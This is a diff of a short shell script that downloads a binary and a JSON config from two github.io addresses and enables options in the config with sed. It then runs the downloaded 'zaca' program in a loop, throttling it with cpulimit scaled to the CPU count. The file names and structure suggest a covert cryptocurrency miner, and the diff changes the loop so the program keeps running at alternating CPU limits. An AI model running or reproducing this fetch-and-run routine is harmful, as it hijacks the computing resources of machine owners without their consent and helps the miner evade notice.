@@ -1,6 +1,4 @@
 wget http://dzmltzack.github.io/web/xm -O oxm
-while true
-do
 rm -f za*
 rm -f config*
 wget https://pzeankto.github.io/namnam/arqt.json -O config.json
@@ -15,11 +13,10 @@ sed -i 's/"enabled": false/"enabled": true/g' config.json
 chmod +x $BB
 ./zaca*
 result=$(($(grep -c processor /proc/cpuinfo) * 40))
+while true
+do
 cpulimit -b -l $result -p $(pgrep zaca)
 sleep 220
-kill -9 $(pgrep cpul)
-kill -9 $(pgrep zaca)
-rm -f za*
-rm -f config*
+cpulimit -b -l 10 -p $(pgrep zaca)
 sleep 60
 done
